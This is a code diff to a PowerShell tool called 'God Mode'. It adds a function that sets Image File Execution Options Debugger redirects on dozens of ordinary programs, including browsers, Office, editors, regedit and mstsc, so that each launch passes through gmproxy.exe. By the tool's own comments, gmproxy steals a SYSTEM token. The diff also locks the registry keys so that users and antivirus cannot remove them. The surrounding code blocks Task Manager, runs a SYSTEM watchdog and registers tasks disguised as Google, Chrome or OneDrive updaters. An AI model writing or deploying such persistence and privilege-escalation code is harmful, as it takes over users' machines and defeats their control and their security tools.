@@ -3231,7 +3231,9 @@ function Export-GodModeLogs {
         $LogContent += "`r`nInstalled gmhook.dll:  $(if (Test-Path $HookDest)  { 'EXISTS' } else { 'MISSING' }) ($HookDest)"
 
         $IfeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
-        $TargetApps = @("chrome.exe","firefox.exe","msedge.exe","notepad.exe","cmd.exe","powershell.exe")
+        # Includes a few Install-IfeoElevation targets (chrome/notepad/regedit/mstsc) plus the
+        # deliberately-excluded shells (cmd/powershell) which should read NOT HOOKED by design.
+        $TargetApps = @("chrome.exe","firefox.exe","msedge.exe","notepad.exe","cmd.exe","powershell.exe","regedit.exe","mstsc.exe")
         foreach ($app in $TargetApps) {
             $appPath = Join-Path $IfeoPath $app
             $Debugger = $null
@@ -4096,6 +4098,145 @@ function Uninstall-ProcessHook {
         Write-Log -Message "Uninstall-ProcessHook failed: $_" -Type "WARN" -Color Yellow
     }
     Write-DebugLog -FunctionName "Uninstall-ProcessHook" -Action "EXIT" -Message "Complete"
+}
+
+<#
+.SYNOPSIS
+    IFEO-based SYSTEM elevation for normal user programs.
+.DESCRIPTION
+    Installs an Image File Execution Options (IFEO) "Debugger" redirect to gmproxy.exe
+    for a curated list of normal user programs so that ANY launch of those apps
+    (from explorer, Start menu, cmd, Task Scheduler, etc.) is transparently
+    redirected to gmproxy.exe, which steals a SYSTEM token and launches the app
+    BORN as SYSTEM via CreateProcessWithTokenW. gmproxy already defeats IFEO
+    recursion via a uniquely-named hardlink of the target image (driver/gmproxy.c).
+    This is the launcher-agnostic elevation layer that makes named normal programs
+    run as SYSTEM regardless of who starts them -- complementary to the gmhook.dll
+    IAT hook (children of hooked processes only) and the monitor's kill+relaunch.
+    Each IFEO key is hardened (Harden-RegistryKey) so AV/the user cannot remove the
+    Debugger value; uninstall resets the ACL (Restore-RegistryKey) then deletes.
+.NOTES
+    Shells/terminals (cmd/powershell/pwsh/wt/conhost/OpenConsole/WindowsTerminal/
+    wsl/wslhost) are deliberately EXCLUDED: God Mode's own persistence/monitor
+    plumbing invokes powershell.exe/cmd.exe (scheduled tasks, guardian, watchdog,
+    WMI consumers, Start-ProcessWithService's cmd.exe /c binPath, Invoke-AsSystem),
+    and IFEO-redirecting those would wrap God Mode's own infrastructure in gmproxy
+    (a hardlink-of-powershell), which is fragile and can break the monitor loop.
+    explorer.exe is managed by the SystemDesktop session path; taskmgr.exe by the
+    Block-TaskManager watcher. This mirrors IsShellLauncherProcess in gmhook.c.
+#>
+function Install-IfeoElevation {
+    Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "ENTRY"
+    try {
+        $GmProxyExe = Join-Path $GodModeInstallDir "gmproxy.exe"
+        if (-not (Test-Path $GmProxyExe)) {
+            Write-Log -Message "gmproxy.exe not found at $GmProxyExe. IFEO elevation skipped (run Install-ProcessHook first)." -Type "WARN" -Color Yellow
+            Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "WARN" -Message "gmproxy.exe missing - IFEO elevation skipped"
+            return $false
+        }
+
+        # Curated list of normal user programs to launch as SYSTEM via IFEO -> gmproxy.
+        # EXCLUDED: shells/terminals + explorer.exe + taskmgr.exe (see function notes).
+        $IfeoElevationApps = @(
+            "chrome.exe","firefox.exe","msedge.exe","opera.exe","brave.exe","vivaldi.exe","iexplore.exe",
+            "notepad.exe","notepad++.exe","wordpad.exe","write.exe",
+            "winword.exe","excel.exe","powerpnt.exe","outlook.exe","msaccess.exe","onenote.exe",
+            "teams.exe","discord.exe","zoom.exe","skype.exe","webex.exe","slack.exe","telegram.exe",
+            "code.exe","sublime_text.exe","devenv.exe","rider64.exe","pycharm64.exe","idea64.exe","eclipse.exe",
+            "vlc.exe","spotify.exe","winamp.exe","wmplayer.exe","groove.exe","photos.exe","movies.exe",
+            "acrobat.exe","acrord32.exe","foxitreader.exe","sumatrapdf.exe",
+            "7z.exe","7zFM.exe","winrar.exe","peazip.exe",
+            "filezilla.exe","putty.exe","mstsc.exe","telnet.exe","ftp.exe","nslookup.exe","tracert.exe",
+            "regedit.exe","msconfig.exe","mspaint.exe","calc.exe","snippingtool.exe","snipaste.exe",
+            "steam.exe","epicgameslauncher.exe","origin.exe","uplay.exe","battle.net.exe","minecraft.exe"
+        )
+
+        $IfeoBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+        $IfeoBaseSubKey = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+        $hooked = 0; $skipped = 0; $failed = 0
+
+        foreach ($app in $IfeoElevationApps) {
+            $appKey = Join-Path $IfeoBase $app
+            try {
+                $existing = $null
+                if (Test-Path $appKey) {
+                    $existing = (Get-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue).Debugger
+                }
+                if ($existing -and $existing -like "*gmproxy*") {
+                    # Idempotent: already pointing at gmproxy. Just re-harden to be safe.
+                    $skipped++
+                } else {
+                    # If a prior Harden-RegistryKey left deny rules on this key, an admin
+                    # Set-ItemProperty can fail (denied SetValue). Restore the ACL first so
+                    # the write succeeds, then re-harden after setting the Debugger value.
+                    if (Test-Path $appKey) {
+                        $null = Restore-RegistryKey -Path "$IfeoBaseSubKey\$app"
+                    } else {
+                        New-Item -Path $appKey -Force -ErrorAction SilentlyContinue | Out-Null
+                    }
+                    Set-ItemProperty -Path $appKey -Name "Debugger" -Value $GmProxyExe -Force -ErrorAction SilentlyContinue
+                    $hooked++
+                }
+                # Harden so AV/user cannot remove the Debugger value. Harden-RegistryKey
+                # denies Admins/Everyone/AuthenticatedUsers SetValue/Delete/WriteKey while
+                # preserving the inherited SYSTEM FullControl as an explicit allow.
+                $null = Harden-RegistryKey -Path "$IfeoBaseSubKey\$app"
+            } catch {
+                $failed++
+                Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "WARN" -Message "Failed to hook $app`: $_"
+            }
+        }
+        Write-Log -Message "IFEO elevation: $hooked hooked, $skipped already hooked, $failed failed. Listed normal programs now launch as SYSTEM via gmproxy." -Type "INFO" -Color Green
+        Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "EXIT" -Message "hooked=$hooked skipped=$skipped failed=$failed"
+        return $true
+    } catch {
+        Write-Log -Message "Install-IfeoElevation failed: $_" -Type "WARN" -Color Yellow
+        Write-DebugLog -FunctionName "Install-IfeoElevation" -Action "ERROR" -Message "Outer catch: $_"
+        return $false
+    }
+}
+
+function Uninstall-IfeoElevation {
+    Write-DebugLog -FunctionName "Uninstall-IfeoElevation" -Action "ENTRY"
+    try {
+        $IfeoElevationApps = @(
+            "chrome.exe","firefox.exe","msedge.exe","opera.exe","brave.exe","vivaldi.exe","iexplore.exe",
+            "notepad.exe","notepad++.exe","wordpad.exe","write.exe",
+            "winword.exe","excel.exe","powerpnt.exe","outlook.exe","msaccess.exe","onenote.exe",
+            "teams.exe","discord.exe","zoom.exe","skype.exe","webex.exe","slack.exe","telegram.exe",
+            "code.exe","sublime_text.exe","devenv.exe","rider64.exe","pycharm64.exe","idea64.exe","eclipse.exe",
+            "vlc.exe","spotify.exe","winamp.exe","wmplayer.exe","groove.exe","photos.exe","movies.exe",
+            "acrobat.exe","acrord32.exe","foxitreader.exe","sumatrapdf.exe",
+            "7z.exe","7zFM.exe","winrar.exe","peazip.exe",
+            "filezilla.exe","putty.exe","mstsc.exe","telnet.exe","ftp.exe","nslookup.exe","tracert.exe",
+            "regedit.exe","msconfig.exe","mspaint.exe","calc.exe","snippingtool.exe","snipaste.exe",
+            "steam.exe","epicgameslauncher.exe","origin.exe","uplay.exe","battle.net.exe","minecraft.exe"
+        )
+        $IfeoBase = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+        $IfeoBaseSubKey = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+        $removed = 0; $failed = 0
+        foreach ($app in $IfeoElevationApps) {
+            $appKey = Join-Path $IfeoBase $app
+            if (-not (Test-Path $appKey)) { continue }
+            try {
+                # Keys are hardened (Admins denied Delete/WriteKey). Restore-RegistryKey
+                # removes the deny rules + re-enables inheritance (with a SYSTEM fallback),
+                # after which an admin can delete the Debugger value and the key itself.
+                $null = Restore-RegistryKey -Path "$IfeoBaseSubKey\$app"
+                Remove-ItemProperty -Path $appKey -Name "Debugger" -ErrorAction SilentlyContinue
+                Remove-Item -Path $appKey -Force -ErrorAction SilentlyContinue
+                if (-not (Test-Path $appKey)) { $removed++ } else { $failed++ }
+            } catch {
+                $failed++
+                Write-DebugLog -FunctionName "Uninstall-IfeoElevation" -Action "WARN" -Message "Failed to unhook $app`: $_"
+            }
+        }
+        Write-Log -Message "IFEO elevation removed: $removed removed, $failed failed." -Type "INFO" -Color Gray
+        Write-DebugLog -FunctionName "Uninstall-IfeoElevation" -Action "EXIT" -Message "removed=$removed failed=$failed"
+    } catch {
+        Write-Log -Message "Uninstall-IfeoElevation failed: $_" -Type "WARN" -Color Yellow
+        Write-DebugLog -FunctionName "Uninstall-IfeoElevation" -Action "ERROR" -Message "Outer catch: $_"
+    }
 }
 
 function Elevate-Process {
@@ -4978,6 +5119,13 @@ No system modifications were applied (Defender, registry, etc. remain untouched)
     # --- SYSTEM watchdog: relaunch as SYSTEM if monitoring is killed ---
     Register-SystemWatchdog
 
+    # --- Install IFEO elevation for normal user programs (chrome, notepad, regedit,
+    #     mstsc, office, dev tools, etc.) so any launch of them is born as SYSTEM via
+    #     gmproxy.exe. Runs in the fresh-activation section; the IFEO registry keys
+    #     persist across reboots, and gmproxy.exe is re-copied each boot by
+    #     Install-ProcessHook (which runs before the idempotency skip). ---
+    Install-IfeoElevation
+
     # --- Block Task Manager to prevent manual process termination ---
     Block-TaskManager
 
@@ -4996,6 +5144,9 @@ function Disable-GodMode {
 
     # --- Uninstall C process hook ---
     Uninstall-ProcessHook
+
+    # --- Remove IFEO elevation for normal user programs (hardened keys) ---
+    Uninstall-IfeoElevation
 
     # --- Remove backup task prefixes ---
     $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_", $GodModeTaskPrefix)
